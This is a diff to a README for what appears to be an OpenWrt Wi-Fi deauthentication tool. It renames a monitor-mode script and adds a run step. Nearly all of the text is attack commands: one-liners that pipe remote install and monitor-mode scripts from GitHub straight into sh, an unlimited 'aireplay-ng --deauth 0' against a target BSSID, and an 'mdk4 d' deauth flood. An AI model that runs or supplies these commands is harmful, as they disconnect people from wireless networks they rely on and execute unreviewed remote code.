@@ -23,13 +23,12 @@ opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-
 
 # Auto install 
 ```sh
-
 opkg update && wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install.sh | sh
 ````
 
 # Using aireplay-ng 
 ```sh
-sh mon.sh && airodump-ng mon0
+sh mon0.sh && airodump-ng mon0
 ```
 > ctrl + c
 ```sh
@@ -39,7 +38,10 @@ aireplay-ng --deauth 0 -a (Mac BSSID)
 ```sh
 wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mon0.sh | sh
 ```
-
+# Run
+```sh
+sh mon0.sh
+```
 # Using mdk4
 ```sh
 sh mon.sh && mdk4 mon0 d
